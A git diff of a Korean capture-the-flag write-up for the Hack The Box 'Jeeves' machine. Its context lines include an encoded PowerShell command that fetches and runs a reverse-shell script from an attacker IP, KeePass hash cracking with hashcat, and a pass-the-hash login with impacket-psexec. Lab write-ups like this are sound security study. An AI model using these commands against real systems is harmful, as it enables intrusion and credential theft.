@@ -2,7 +2,7 @@
 slug: "jeeves"
 title: "Jeeves"
 date: 2026-07-15
-category: "HTB"
+category: "윈도우"
 tags: []
 excerpt: "50000에 고버스터 풀 문자열 때리니까 ```sh gobuster dir -u http://10.129.228.112:50000/ -w…"
 readingTime: 8
@@ -57,7 +57,7 @@ nc -lnvp 443
 ```groovy
 "PowerShell.exe -Exec ByPass -Nol -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA4ADoAOAAwADAAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQAKAA==".execute()
 ```
-![[Pasted image 20260715174532.png|611]]
+![](assets/images/posts/Pasted%20image%2020260715174532.png)
 -> 이러면 다운로드와 동시에 파일을 실행함
 **user.txt :** e3232272596fb47950d59c4cf1e7066a
 
@@ -95,11 +95,11 @@ keepass2john CEH.kdbx > cred.hash
 
 hashcat -m 13400 ./crack.hash /usr/share/wordlists/rockyou.txt 
 ```
-![[Pasted image 20260715180209.png]]
+![](assets/images/posts/Pasted%20image%2020260715180209.png)
 
 이제 keepass2로 들어가서 해당 크레덴셜로 파일을 열어줌
-![[Pasted image 20260715180322.png|323]]
-![[Pasted image 20260715180348.png|327]]
+![](assets/images/posts/Pasted%20image%2020260715180322.png)
+![](assets/images/posts/Pasted%20image%2020260715180348.png)
 -> 가장 아래 있는 녀석의 비밀번호가 아래와 같은데aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
 
 ssh가 안열려 있지만 SMB가 열려 있으니 이를 적극 활용하면됨
@@ -109,7 +109,7 @@ impacket-psexec administrator@10.129.228.112 -hashes aad3b435b51404eeaad3b435b51
 -> 권한 상승 성공!
 
 근데 이 박스가 날 화나게 하는게 여기까지 했으면 플래그를 그냥 주면 좋겠지만 순순히 내놓질 않음
-![[Pasted image 20260715180745.png|467]]
+![](assets/images/posts/Pasted%20image%2020260715180745.png)
 
 저게 ADS 라는 개념인데 
 **NTFS ADS의 "스트림"**  
@@ -117,7 +117,7 @@ impacket-psexec administrator@10.129.228.112 -hashes aad3b435b51404eeaad3b435b51
 ```cmd
 dir /A /R
 ```
-![[Pasted image 20260715181558.png|452]]
+![](assets/images/posts/Pasted%20image%2020260715181558.png)
 -> 이런 식으로 하면 모든 안보이는 파일을 다 볼 수 있음
 읽을땐
 
